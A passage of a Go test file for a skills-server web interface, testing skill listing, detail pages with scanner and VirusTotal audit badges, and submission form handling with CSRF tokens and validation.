package web

import (
	"archive/zip"
	"bytes"
	"context"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nanoinfraorg/skills-server/internal/api"
	"github.com/nanoinfraorg/skills-server/internal/github"
	"github.com/nanoinfraorg/skills-server/internal/pipeline"
	"github.com/nanoinfraorg/skills-server/internal/scan"
	"github.com/nanoinfraorg/skills-server/internal/store"
)

const testValidSkillMD = "---\nname: my-skill\ndescription: Does a useful thing.\n---\n\nBody.\n"

// skillMDFor builds a minimal, valid SKILL.md whose frontmatter name
// matches skillID -- the pipeline rejects a submission whose frontmatter
// name doesn't match the submitted skill_id, so every test that submits
// under a skill id other than "my-skill" needs its own matching fixture
// rather than the fixed testValidSkillMD.
func skillMDFor(skillID string) string {
	return "---\nname: " + skillID + "\ndescription: Test skill " + skillID + ".\n---\n\nBody.\n"
}

// fakePublisher stands in for internal/github.Client, exactly like
// internal/api's own test helper of the same shape (unexported there, so
// re-declared here rather than shared -- it's test fixture, not business
// logic).
type fakePublisher struct {
	calls int
}

func (f *fakePublisher) PublishFiles(_ context.Context, _ string, _ []github.File, _ string) error {
	f.calls++
	return nil
}

// testHandler wires a fresh in-memory-backed *api.Handler (SQLite on a
// temp file) and a matching *web.Handler pointed at it, plus a fake
// publisher so nothing here touches the network or GitHub.
func testHandler(t *testing.T) (*Handler, *api.Handler, *fakePublisher) {
	t.Helper()
	dir := t.TempDir()
	db, err := store.Open(filepath.Join(dir, "test.db"))
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { db.Close() })

	pub := &fakePublisher{}
	apiHandler := &api.Handler{
		Store:          db,
		Publisher:      pub,
		Logger:         slog.New(slog.NewTextHandler(io.Discard, nil)),
		SubmitterToken: "submitter-secret",
		AdminToken:     "admin-secret",
		SubmissionsDir: filepath.Join(dir, "submissions"),
		PublishedDir:   filepath.Join(dir, "published"),
		GitHubRepo:     "nanoinfraorg/skills",
		Now:            func() time.Time { return time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC) },
	}
	if err := os.MkdirAll(apiHandler.SubmissionsDir, 0o755); err != nil {
		t.Fatalf("mkdir submissions: %v", err)
	}
	if err := os.MkdirAll(apiHandler.PublishedDir, 0o755); err != nil {
		t.Fatalf("mkdir published: %v", err)
	}

	h := New(apiHandler, apiHandler.Logger)
	return h, apiHandler, pub
}

// newMux builds the combined api+web mux, mirroring how
// cmd/skills-server/main.go wires the two together.
func newMux(h *Handler) *http.ServeMux {
	mux := api.NewMux(h.API)
	Register(mux, h)
	return mux
}

// seedSession inserts a session row directly (bypassing the Google OAuth
// flow entirely, which internal/api's own tests already cover end to end)
// and returns a cookie ready to attach to a request.
func seedSession(t *testing.T, apiHandler *api.Handler, email string, role store.SessionRole, csrfToken string) *http.Cookie {
	t.Helper()
	id := "session-" + email
	sess := store.Session{
		ID:        id,
		Email:     email,
		Role:      role,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(time.Hour),
		CSRFToken: csrfToken,
	}
	if err := apiHandler.Store.CreateSession(context.Background(), sess); err != nil {
		t.Fatalf("seed session: %v", err)
	}
	return &http.Cookie{Name: api.SessionCookieName, Value: id}
}

// buildZip creates an in-memory zip archive from name->content pairs, same
// helper shape as internal/api's own test fixture builder.
func buildZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("create zip entry %s: %v", name, err)
		}
		if _, err := w.Write([]byte(content)); err != nil {
			t.Fatalf("write zip entry %s: %v", name, err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("close zip writer: %v", err)
	}
	return buf.Bytes()
}

// submitFormRequest builds a multipart POST /submit request.
func submitFormRequest(t *testing.T, cookie *http.Cookie, fields map[string]string, archive []byte) *http.Request {
	t.Helper()
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	for k, v := range fields {
		if err := mw.WriteField(k, v); err != nil {
			t.Fatalf("write field %s: %v", k, err)
		}
	}
	if archive != nil {
		part, err := mw.CreateFormFile("archive", "skill.zip")
		if err != nil {
			t.Fatalf("create form file: %v", err)
		}
		if _, err := part.Write(archive); err != nil {
			t.Fatalf("write archive: %v", err)
		}
	}
	if err := mw.Close(); err != nil {
		t.Fatalf("close multipart writer: %v", err)
	}

	req := httptest.NewRequest(http.MethodPost, "/submit", &body)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	if cookie != nil {
		req.AddCookie(cookie)
	}
	return req
}

// urlencodedRequest builds a POST request with an application/x-www-form-urlencoded
// body -- used for the admin approve/reject/rescan actions, none of which
// upload a file.
func urlencodedRequest(method, path string, cookie *http.Cookie, form map[string]string) *http.Request {
	values := make([]string, 0, len(form))
	for k, v := range form {
		values = append(values, k+"="+v)
	}
	req := httptest.NewRequest(method, path, strings.NewReader(strings.Join(values, "&")))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if cookie != nil {
		req.AddCookie(cookie)
	}
	return req
}

func TestHome_RendersForAnonymousAndLoggedIn(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("anonymous home status = %d, want 200", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "Sign in with Google") {
		t.Errorf("expected a sign-in link for an anonymous visitor, body: %s", rec.Body.String())
	}

	cookie := seedSession(t, apiHandler, "alice@example.com", store.SessionRoleSubmitter, "csrf-1")
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.AddCookie(cookie)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("logged-in home status = %d, want 200", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "alice@example.com") {
		t.Errorf("expected the logged-in email in the welcome page, body: %s", rec.Body.String())
	}
}

func TestSkills_TrendingAndSearch(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "alpha", Version: 1, SubmissionID: "seed-alpha", DisplayName: "Alpha",
		Description: "first skill", GitHubPath: "alpha/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "alpha", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills", nil))
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "Alpha") {
		t.Fatalf("trending listing status = %d, expected to contain Alpha, body: %s", rec.Code, rec.Body.String())
	}

	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills?q=alpha", nil))
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "Alpha") {
		t.Fatalf("search status = %d, expected to contain Alpha, body: %s", rec.Code, rec.Body.String())
	}

	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills?q=nonexistent", nil))
	if rec.Code != http.StatusOK || strings.Contains(rec.Body.String(), "Alpha") {
		t.Fatalf("empty search result should not contain Alpha, body: %s", rec.Body.String())
	}
}

func TestSkillDetail_FoundAndNotFound(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "beta", Version: 1, SubmissionID: "seed-beta", DisplayName: "Beta",
		Description: "second skill", GitHubPath: "beta/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "beta", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/beta", nil))
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "Beta") {
		t.Fatalf("detail status = %d, expected 200 containing Beta, body: %s", rec.Code, rec.Body.String())
	}

	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/does-not-exist", nil))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("detail for missing skill status = %d, want 404", rec.Code)
	}
}

// TestCatchAll_UnknownPathRendersStyled404 confirms a path matching no
// registered route (not "/skills/{id}" with a bad id -- a path with no
// route at all) gets the site's own styled not-found page instead of
// net/http's plain-text default, and that real routes (including the
// exact root "/" and the JSON API's own paths, both far more specific
// patterns) are unaffected by the "/" catch-all.
func TestCatchAll_UnknownPathRendersStyled404(t *testing.T) {
	h, _, _ := testHandler(t)
	mux := newMux(h)

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/this/path/does/not/exist", nil))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want 404, body: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "skills-server") || !strings.Contains(rec.Body.String(), "No such page") {
		t.Errorf("expected the site's styled layout/message, got: %s", rec.Body.String())
	}

	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/", nil))
	if rec.Code != http.StatusOK {
		t.Errorf("exact root status = %d, want 200 (Home, not the catch-all)", rec.Code)
	}

	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/healthz", nil))
	if rec.Code != http.StatusOK {
		t.Errorf("healthz status = %d, want 200 (api.NewMux's route, not the catch-all)", rec.Code)
	}
}

func TestSkillDetail_ShowsNanoinfraScannerAudit(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	svID, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "audited", Version: 1, SubmissionID: "seed-audited", DisplayName: "Audited",
		Description: "has a scan", GitHubPath: "audited/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	})
	if err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "audited", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}
	if _, err := apiHandler.Store.CreateScan(ctx, store.Scan{
		TargetType: store.ScanTargetSkillVersion,
		TargetID:   api.ScanIDString(svID),
		Trigger:    store.ScanTriggerPipeline,
		Verdict:    store.ScanVerdict(scan.VerdictFlagged),
		TextOnlyOK: true,
		ScannedAt:  time.Now(),
	}); err != nil {
		t.Fatalf("seed scan: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/audited", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "NanoInfra Scanner") {
		t.Errorf("expected the NanoInfra Scanner audit to be listed, got: %s", body)
	}
	if !strings.Contains(body, "WARN") {
		t.Errorf("expected a WARN badge for a flagged verdict, got: %s", body)
	}
}

func TestSkillDetail_ShowsBothAuditsWhenVirusTotalRowExists(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	svID, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "double-audited", Version: 1, SubmissionID: "seed-double-audited", DisplayName: "Double Audited",
		Description: "has both audits", GitHubPath: "double-audited/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	})
	if err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "double-audited", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}
	if _, err := apiHandler.Store.CreateScan(ctx, store.Scan{
		TargetType: store.ScanTargetSkillVersion,
		TargetID:   api.ScanIDString(svID),
		Trigger:    store.ScanTriggerPipeline,
		Verdict:    store.ScanVerdict(scan.VerdictPass),
		TextOnlyOK: true,
		ScannedAt:  time.Now(),
	}); err != nil {
		t.Fatalf("seed nanoinfra scan: %v", err)
	}

	vtID, err := apiHandler.Store.CreateVirusTotalScan(ctx, svID, "analysis-double", time.Now())
	if err != nil {
		t.Fatalf("seed virustotal scan: %v", err)
	}
	if err := apiHandler.Store.UpdateVirusTotalScanResult(ctx, vtID, 3, 1, 60, 6, "https://www.virustotal.com/gui/file-analysis/analysis-double", time.Now()); err != nil {
		t.Fatalf("update virustotal scan result: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/double-audited", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "NanoInfra Scanner") {
		t.Errorf("expected the NanoInfra Scanner audit to be listed, got: %s", body)
	}
	if !strings.Contains(body, "VirusTotal") {
		t.Errorf("expected the VirusTotal audit to be listed, got: %s", body)
	}
	if !strings.Contains(body, "4/70 engines flagged this file") {
		t.Errorf("expected the VirusTotal engine-count detail, got: %s", body)
	}
	// 3 malicious engines => "fail", rendered as the FAIL badge.
	if !strings.Contains(body, "FAIL") {
		t.Errorf("expected a FAIL badge for a malicious virustotal verdict, got: %s", body)
	}
}

func TestSkillDetail_NoVirusTotalRowShowsOnlyNanoinfraScannerAudit(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	svID, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "single-audited", Version: 1, SubmissionID: "seed-single-audited", DisplayName: "Single Audited",
		Description: "no virustotal row", GitHubPath: "single-audited/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	})
	if err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "single-audited", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}
	if _, err := apiHandler.Store.CreateScan(ctx, store.Scan{
		TargetType: store.ScanTargetSkillVersion,
		TargetID:   api.ScanIDString(svID),
		Trigger:    store.ScanTriggerPipeline,
		Verdict:    store.ScanVerdict(scan.VerdictPass),
		TextOnlyOK: true,
		ScannedAt:  time.Now(),
	}); err != nil {
		t.Fatalf("seed nanoinfra scan: %v", err)
	}
	// Deliberately no CreateVirusTotalScan call -- mirrors VirusTotal being
	// unconfigured, or the fire-and-forget upload having failed.

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/single-audited", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "NanoInfra Scanner") {
		t.Errorf("expected the NanoInfra Scanner audit to be listed, got: %s", body)
	}
	if strings.Contains(body, "VirusTotal") {
		t.Errorf("expected no VirusTotal audit entry when no row exists, got: %s", body)
	}
}

func TestSkillDetail_NoScanShowsPendingAudit(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "unaudited", Version: 1, SubmissionID: "seed-unaudited", DisplayName: "Unaudited",
		Description: "no scan yet", GitHubPath: "unaudited/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "unaudited", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/unaudited", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "NanoInfra Scanner") || !strings.Contains(body, "PENDING") {
		t.Errorf("expected a pending NanoInfra Scanner audit, got: %s", body)
	}
}

func TestSkillDetail_QuarantinedShowsClearly(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "gamma", Version: 1, SubmissionID: "seed-gamma", DisplayName: "Gamma",
		Description: "quarantined one", GitHubPath: "gamma/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "gamma", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}
	if err := apiHandler.Store.SetSkillVersionStatus(ctx, "gamma", 1, store.SkillVersionQuarantined); err != nil {
		t.Fatalf("quarantine: %v", err)
	}

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/gamma", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (quarantined is shown, not hidden)", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "quarantined") {
		t.Errorf("expected the page to clearly say the version is quarantined, body: %s", rec.Body.String())
	}
}

// TestSkillDetail_RendersSKILLMDContentAndFileListing seeds a real,
// archived zip copy at PublishedDir/<id>.zip (the same file DownloadSkill
// serves) and confirms the detail page renders the actual SKILL.md body
// text and lists every file in the archive, not just the skill's
// name/version/description metadata.
func TestSkillDetail_RendersSKILLMDContentAndFileListing(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	skillMD := "---\nname: delta\ndescription: renders real content.\n---\n\nDistinctive delta body text.\n"
	archiveBytes := buildZip(t, map[string]string{
		"SKILL.md":          skillMD,
		"scripts/helper.sh": "#!/bin/sh\necho hi\n",
	})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, "delta.zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "delta", Version: 1, SubmissionID: "seed-delta", DisplayName: "Delta",
		Description: "renders real content", GitHubPath: "delta/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "delta", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	// Anonymous: content/files render, but there's no edit entry point.
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/delta", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Distinctive delta body text.") {
		t.Errorf("expected the page to render the real SKILL.md content, body: %s", body)
	}
	if !strings.Contains(body, "scripts/helper.sh") {
		t.Errorf("expected a file listing including scripts/helper.sh, body: %s", body)
	}
	if strings.Contains(body, "Edit / submit new version") {
		t.Errorf("anonymous visitor should not see the edit link, body: %s", body)
	}

	// Logged in: same content, plus the edit entry point.
	cookie := seedSession(t, apiHandler, "viewer@example.com", store.SessionRoleSubmitter, "csrf-viewer")
	req := httptest.NewRequest(http.MethodGet, "/skills/delta", nil)
	req.AddCookie(cookie)
	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	body = rec.Body.String()
	if !strings.Contains(body, `href="/submit?skill_id=delta"`) {
		t.Errorf("expected a logged-in visitor to see the edit link to /submit?skill_id=delta, body: %s", body)
	}
}

func TestSubmitForm_RedirectsAnonymousToLogin(t *testing.T) {
	h, _, _ := testHandler(t)
	mux := newMux(h)

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/submit", nil))
	if rec.Code != http.StatusFound {
		t.Fatalf("status = %d, want 302", rec.Code)
	}
	if loc := rec.Header().Get("Location"); loc != "/auth/google/login" {
		t.Errorf("Location = %q, want /auth/google/login", loc)
	}
}

func TestSubmitForm_RendersForSubmitterSession(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "sub@example.com", store.SessionRoleSubmitter, "csrf-1")

	req := httptest.NewRequest(http.MethodGet, "/submit", nil)
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `name="csrf_token" value="csrf-1"`) {
		t.Errorf("expected the form to embed the session's csrf token, body: %s", rec.Body.String())
	}
}

// TestSubmitForm_EditPrefillPopulatesCurrentContent seeds a published skill
// with a real archived copy, then confirms GET /submit?skill_id=<id>
// pre-fills the form with that skill's current display name, its actual
// SKILL.md content, and locks the skill_id field (readonly) so the edit
// can't silently become a fresh submission under a different id.
func TestSubmitForm_EditPrefillPopulatesCurrentContent(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	skillMD := skillMDFor("epsilon")
	archiveBytes := buildZip(t, map[string]string{"SKILL.md": skillMD})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, "epsilon.zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "epsilon", Version: 1, SubmissionID: "seed-epsilon", DisplayName: "Epsilon",
		Description: "Test skill epsilon.", GitHubPath: "epsilon/", PublishedAt: time.Now(), Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, "epsilon", 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}

	cookie := seedSession(t, apiHandler, "editor@example.com", store.SessionRoleSubmitter, "csrf-edit")
	req := httptest.NewRequest(http.MethodGet, "/submit?skill_id=epsilon", nil)
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, skillMD) {
		t.Errorf("expected the textarea to be pre-filled with the current SKILL.md content, body: %s", body)
	}
	if !strings.Contains(body, `value="epsilon"`) {
		t.Errorf("expected the skill_id field pre-filled with epsilon, body: %s", body)
	}
	if !strings.Contains(body, "readonly") {
		t.Errorf("expected the skill_id field to be locked (readonly) when editing, body: %s", body)
	}
	if !strings.Contains(body, `value="Epsilon"`) {
		t.Errorf("expected the display name pre-filled, body: %s", body)
	}

	// A fresh (non-edit) visit to /submit must NOT be locked.
	freshReq := httptest.NewRequest(http.MethodGet, "/submit", nil)
	freshReq.AddCookie(cookie)
	freshRec := httptest.NewRecorder()
	mux.ServeHTTP(freshRec, freshReq)
	if strings.Contains(freshRec.Body.String(), "readonly") {
		t.Errorf("a fresh submission's skill_id field must not be locked, body: %s", freshRec.Body.String())
	}
}

// TestSubmitCreate_TextModeHappyPathCreatesRealPendingSubmission exercises
// the second submission mode end to end: a pasted SKILL.md string instead
// of an uploaded zip. It must produce a real pending submission whose
// stored archive is an actual, valid, pipeline-validated zip -- i.e. the
// textarea input converges on the exact same on-disk shape a real upload
// produces, via the same CreateSubmissionCore call.
func TestSubmitCreate_TextModeHappyPathCreatesRealPendingSubmission(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "texter@example.com", store.SessionRoleSubmitter, "csrf-text")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "text-skill", "display_name": "Text Skill", "csrf_token": "csrf-text",
		"skill_md": skillMDFor("text-skill"),
	}, nil)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusSeeOther {
		t.Fatalf("status = %d, want 303, body: %s", rec.Code, rec.Body.String())
	}
	if loc := rec.Header().Get("Location"); loc != "/my/submissions" {
		t.Errorf("Location = %q, want /my/submissions", loc)
	}

	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "texter@example.com")
	if err != nil || len(subs) != 1 {
		t.Fatalf("expected 1 stored submission, err=%v subs=%+v", err, subs)
	}
	if subs[0].Status != store.StatusPending {
		t.Errorf("status = %s, want pending", subs[0].Status)
	}

	result, err := pipeline.ValidateArchive(subs[0].ArchivePath, "text-skill")
	if err != nil {
		t.Fatalf("stored archive is not a valid, pipeline-validated zip: %v", err)
	}
	if result.Metadata.Name != "text-skill" {
		t.Errorf("frontmatter name = %q, want text-skill", result.Metadata.Name)
	}
}

// TestSubmitCreate_TextModeMissingFrontmatterFieldRejectedSameAsZip mirrors
// TestSubmitCreate_InvalidArchiveShowsInlineError's zip-mode case (missing
// required frontmatter) applied to the textarea path: the shared
// CreateSubmissionCore/pipeline.ValidateArchive logic means this doesn't
// need its own separate validation rules -- the same rejection applies.
func TestSubmitCreate_TextModeMissingFrontmatterFieldRejectedSameAsZip(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "texter2@example.com", store.SessionRoleSubmitter, "csrf-text2")

	badSkillMD := "---\nname: text-skill-2\n---\n\nMissing description field.\n"
	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "text-skill-2", "display_name": "Text Skill 2", "csrf_token": "csrf-text2",
		"skill_md": badSkillMD,
	}, nil)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d, want 422, body: %s", rec.Code, rec.Body.String())
	}
	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "texter2@example.com")
	if err != nil || len(subs) != 0 {
		t.Fatalf("expected no stored submission for invalid frontmatter, err=%v subs=%+v", err, subs)
	}
}

// TestSubmitCreate_TextModeNameMismatchRejectedSameAsZip mirrors the
// zip-mode skill_id/frontmatter-name mismatch rejection for the textarea
// path.
func TestSubmitCreate_TextModeNameMismatchRejectedSameAsZip(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "texter3@example.com", store.SessionRoleSubmitter, "csrf-text3")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "text-skill-3", "display_name": "Text Skill 3", "csrf_token": "csrf-text3",
		"skill_md": skillMDFor("some-other-id"),
	}, nil)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d, want 422, body: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "does not match") {
		t.Errorf("expected an inline name-mismatch error, body: %s", rec.Body.String())
	}
	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "texter3@example.com")
	if err != nil || len(subs) != 0 {
		t.Fatalf("expected no stored submission for a name mismatch, err=%v subs=%+v", err, subs)
	}
}

// TestSubmitCreate_NeitherArchiveNorTextRejected confirms a submission with
// neither an uploaded zip nor pasted SKILL.md text is rejected with a
// clear inline error rather than, say, silently creating an empty
// submission.
func TestSubmitCreate_NeitherArchiveNorTextRejected(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	cookie := seedSession(t, apiHandler, "empty@example.com", store.SessionRoleSubmitter, "csrf-empty")

	req := submitFormRequest(t, cookie, map[string]string{
		"skill_id": "empty-skill", "display_name": "Empty Skill", "csrf_token": "csrf-empty",
	}, nil)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400, body: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "either a .zip archive or SKILL.md text is required") {
		t.Errorf("expected the inline error explaining both modes are empty, body: %s", rec.Body.String())
	}
	subs, err := apiHandler.Store.ListSubmissionsBySubmitter(context.Background(), "empty@example.com")
	if err != nil || len(subs) != 0 {
		t.Fatalf("expected no stored submission, err=%v subs=%+v", err, subs)
	}
}

// TestSubmitCreate_EditPrefilledFormButPostingDifferentSkillIDStillValidatesNormally
// confirms there is no separate "edit" code path with special-cased trust:
// the skill_id field being rendered readonly on the edit-prefilled form is
// a UI hint only, not a server-side lock. Posting a different skill_id
// (with matching frontmatter) must succeed as a completely normal
// submission for that new id; posting a skill_id that doesn't match the
// frontmatter name must still be rejected exactly as it would for a fresh,
// non-edit submission.
func TestSubmitCreate_EditPrefilledFormButPostingDifferentSkillIDStillValidatesNormally(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	ctx := context.Background()

	archiveBytes := buildZip(t, map[string]string{"SKILL.md": skillMDFor("original")})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, "original.zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: "original", Version: 1, SubmissionID: "seed-original", DisplayName: "Original",
